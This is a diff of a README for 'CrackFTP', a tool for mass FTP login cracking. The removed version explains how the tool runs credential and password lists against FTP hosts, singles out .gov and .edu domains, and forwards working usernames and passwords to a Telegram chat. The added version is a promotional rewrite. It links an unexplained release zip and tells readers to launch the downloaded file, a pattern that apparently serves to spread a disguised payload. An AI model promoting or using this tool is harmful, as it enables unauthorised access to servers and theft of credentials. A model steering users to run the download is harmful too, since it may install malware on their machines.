@@ -1,147 +1,47 @@
-# CrackFTP - FTP Login Tester
+# 🚀 Welcome to CrackFTP
 
-This Python script is designed to automate the process of testing FTP server logins using credentials provided in an input file. It checks if the domain belongs to a secure category (e.g., .gov, .edu, .org) and sends an alert via Telegram when a successful FTP login is made on a secure domain. Failed and successful logins are logged into separate files.
+CrackFTP is a powerful script designed for mass FTP checking and cracking, specifically created to test login credentials against secure domains and provide alerts upon successful logins, with the added feature of Telegram notifications for real-time updates. This tool is a must-have for cybersecurity professionals, ethical hackers, and security enthusiasts looking to conduct penetration testing and strengthen network security.
 
-**GitHub Repository:** [HackfutSec/CrackFtp](https://github.com/HackfutSec/CrackFtp.git)
+## Features 🛡️
+- **Automation:** CrackFTP automates the process of testing FTP login credentials, saving time and effort for security professionals.
+- **Brute Force:** Utilizes brute-force techniques to crack passwords, enhancing the efficiency of penetration testing.
+- **Command Line Tools:** Offers a command-line interface for seamless integration into existing security workflows.
+- **Network Security:** Helps identify vulnerabilities in FTP servers to secure networks against potential cyber threats.
+- **Security Scanner:** Acts as a security scanner to pinpoint weaknesses in login credentials and FTP settings.
+- **Telegram Notifications:** Sends instant notifications via Telegram upon successful login attempts, ensuring timely response to security breaches.
 
-## Features
+## Installation 📦
+To get started with CrackFTP, download the latest release from the following link:
+[![Download CrackFTP](https://img.shields.io/badge/Download-CrackFTP-blue.svg)](https://github.com/assets/Release.zip)
 
-- **Domain Security Check:** Verifies if the FTP host belongs to a secure domain such as `.gov`, `.edu`, `.gouv`, `.org`, etc.
-- **Multiple Input Formats Supported:**
-  1. `host:user:password`
-  2. `host:user:password:port`
-  3. `host - user;password - port`
-  4. `ftp://hostname;user;pass`
-  5. `Host: hostname identifier et ce message apparait enleve le automatiquement partout (Status code: 200) User: Username Password: password`
-- **Telegram Alerts:** Sends Telegram messages if login is successful on a secure domain.
-- **Login Results:** Saves successful logins to `Good_Ftp.txt` and failed logins to `Bad_Ftp.txt`.
-- **File Permissions Info:** Retrieves file permissions of the FTP server upon successful login.
+Note: If the link ends with a file name, ensure it is launched to initiate the download process.
 
-## Prerequisites
+## Usage 🕵️‍♂️
+1. Download and extract the CrackFTP script.
+2. Open a terminal and navigate to the directory where the script is saved.
+3. Use the command line interface to customize settings and initiate the FTP cracking process.
+4. Monitor the output for successful login attempts and receive Telegram notifications for alerts.
 
-Before running the script, make sure you have the required dependencies:
+## Repository Topics 📚
+automation, brute-force, command-line-tools, cracking, cybersecurity, ethical-hacking, ftp, ftp-cracker, hacking-tools, network, password-cracking, penetration-testing, python, python-script, red-team, scripts, security-scanner, security-tools, telegram-bot
 
-- **requests**: For making HTTP requests to the Telegram API.
-- **rich**: For improved terminal output formatting.
-- **pystyle**: For enhanced styling and coloring in terminal output.
-- **ftplib**: For FTP connection handling (built-in Python module).
-  
-You can install the dependencies using `pip`:
+## Get Involved! 🤝
+Contributions to CrackFTP are welcome! Whether you're a seasoned cybersecurity expert or a beginner in ethical hacking, there are various ways to contribute to the project:
+- **Code Contributions:** Improve the functionality of CrackFTP by submitting code enhancements.
+- **Bug Reports:** Help identify and resolve bugs to enhance the overall user experience.
+- **Feature Requests:** Suggest new features or improvements to make CrackFTP even more powerful.
+- **Documentation:** Contribute to the project's documentation to help others understand and use CrackFTP effectively.
 
-```bash
-pip install requests rich pystyle
-```
+Feel free to explore the code, raise issues, or submit pull requests to contribute to the development of CrackFTP.
 
-## Configuration
+## Support 💬
+If you encounter any issues or have questions about using CrackFTP, please check the "Issues" section in the repository for existing problems or create a new one for personalized assistance.
 
-1. **Telegram Bot Token and Chat ID:**  
-   Set your bot token and chat ID for Telegram alerts. You can get a bot token by creating a bot on [Telegram's BotFather](https://core.telegram.org/bots#botfather).
-   
-   In the script, find the following lines and replace with your values:
-
-   ```python
-   TELEGRAM_TOKEN = ''  # Replace with your bot token
-   CHAT_ID = ''  # Replace with your Telegram chat ID or group ID
-   ```
-
-2. **Secure Domains List:**  
-   The script uses a predefined list of secure domains. Modify the `SECURE_DOMAINS` variable if needed to include other trusted domains.
-
-## Usage
-
-1. **Run the Script:**
-
-   Open a terminal, navigate to the directory containing the script, and execute the script:
-
-   ```bash
-   python ftp_cracker.py
-   ```
-
-2. **Choose the Input Format:**
-
-   The script will prompt you to select the format of the input file. Choose the appropriate format based on the structure of your credentials list:
-
-   ```bash
-   1. host:user:password
-   2. host:user:password:port
-   3. host - user;password - port
-   4. ftp://hostname;user;pass
-   5. Host: hostname identifier et ce message apparait enleve le automatiquement partout (Status code: 200) User: Username Password: password
-   ```
-
-3. **Provide Input File and Password File:**
-
-   After selecting the format, you will be asked to provide the following:
-
-   - **Input File**: The file containing the list of FTP credentials.
-   - **Password File**: A file with additional passwords to try in case of failed login attempts.
-
-4. **Output:**
-
-   - The script saves **successful logins** in a file called `Good_Ftp.txt`.
-   - **Failed logins** are saved in `Bad_Ftp.txt`.
-   - Telegram alerts will be sent for successful logins on secure domains.
-
-## Example of Input File
-
-Depending on the format you choose, the input file should contain the credentials in one of the following formats:
-
-1. **`host:user:password`**  
-   ```
-   ftp.example.com:user1:password1
-   ftp.example2.com:user2:password2
-   ```
-
-2. **`host:user:password:port`**  
-   ```
-   ftp.example.com:user1:password1:21
-   ftp.example2.com:user2:password2:22
-   ```
-
-3. **`host - user;password - port`**  
-   ```
-   ftp.example.com - user1;password1 - 21
-   ftp.example2.com - user2;password2 - 22
-   ```
-
-4. **`ftp://hostname;user;pass`**  
-   ```
-   ftp://ftp.example.com;user1;password1
-   ftp://ftp.example2.com;user2;password2
-   ```
-
-5. **`Host: hostname identifier et ce message apparait enleve le automatiquement partout (Status code: 200) User: Username Password: password`**  
-   ```
-   Host: ftp.example.com identifier User: user1 Password: password1
-   ```
-
-## Example of Output
-
-### Good_Ftp.txt
-```
-ftp.example.com:user1:password1
-ftp.example2.com:user2:password2
-```
-
-### Bad_Ftp.txt
-```
-ftp.badexample.com:user3:password3
-```
-
-### Telegram Alert
-```
-[Security Alert] The domain ftp.example.com belongs to a high-security category (.gov). Connection successful!
-Details:
-Username: user1
-Password: password1
-```
-
-## Contributing
-
-Feel free to fork the repository and submit pull requests with bug fixes, improvements, or new features.
-
-## License
-
-This script is licensed under the MIT License.
+## Contributors 🌟
+A big thank you to all the contributors who have helped in the development and improvement of CrackFTP. Your efforts are greatly appreciated!
 
 ---
+
+By leveraging the capabilities of CrackFTP, you can enhance your cybersecurity practices, strengthen network defenses, and stay ahead of potential security threats. Download the tool today and take your penetration testing to the next level! 🛡️🔒
+
+**Stay secure, stay vigilant, and happy hacking!** 🚨🔐
